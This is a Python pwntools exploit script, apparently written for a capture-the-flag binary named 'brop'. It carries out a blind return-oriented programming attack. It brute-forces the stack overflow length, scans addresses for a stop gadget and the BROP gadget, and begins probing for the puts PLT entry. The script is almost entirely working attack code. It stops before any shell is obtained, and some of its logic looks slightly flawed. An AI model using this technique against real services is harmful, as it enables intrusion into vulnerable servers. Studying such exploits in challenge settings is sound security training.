from pwn import *
#context.log_level='debug'
def getoverflowlength():
    i=1
    while 1:                  
        try:
            p=process('./brop')
            p.recvuntil('WelCome my friend,Do you know password?\n')
            p.send(i*'a')
            output=p.recv()  
            p.close()
            if not output.startswith('No password'): 
                return i-1
            else:
                i+=1

        except EOFError:
            p.close()
            return i-1
#length=getoverflowlength()
#print (length)
length=72
def getstopgadget(length):
    addr=0x400000
    while 1:
        try:
            p=process('./brop')
            p.recvuntil('password?\n')
            payload='a'*length+p64(addr)
            p.sendline(payload)
            content=p.recv()
            print content
            p.close()
            print 'one success: 0x%x'%(addr)
            return addr
        except Exception:
            addr+=1
            p.close()
#stop_addr=getstopgadget(length)
stop_addr=0x401025
def getbropgadget(length,addr,stop_addr):
    try:
        p=process('./brop')
        p.recvuntil('password?\n')
        payload='a'*length+p64(addr)+p64(0)*6+p64(stop_addr)+p64(0)*10
        p.sendline(payload)
        content=p.recv()
        p.close()
        if not content.startswith('WelCome'):
            return False
        return True
    except Exception:
        p.close()
        return False
def check_brop_gadget(length, addr):
    try:
        #sh = remote('127.0.0.1', 9999)
        sh=process('./brop')
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True
addr=0x40119f
#'''
while 1:
    print hex(addr)
    if getbropgadget(length,addr,stop_addr):
        print 'possible brop gadget:0x%x'%(addr)
        if check_brop_gadget(length, addr):
            print 'success brop gadget: 0x%x' % addr
            break
    addr+=1
#'''
brop_gadget=0x401070
def getputsplt(length,rdi_ret,stop_addr):
    addr=0x401000
    while 1:
        print hex (addr)
        p=process('./brop')
        p.recvuntil('password?\n')
        payload='a'*length+p64(rdi_ret)+p64(0x401000)+p64(addr)+p64(stop_addr)
        p.sendline(payload)
        try:
            p.close()
            content=p.recv()
            print content
            if content.startswith("H\203\354\bH\213\005\355/"):
                print 'putsplt:0x%x'%(addr)
                return addr
            addr+=1
        except Exception:
            p.close()
            addr+=1
rdi_ret=0x401079
#puts_plt=getputsplt(length,rdi_ret,stop_addr)
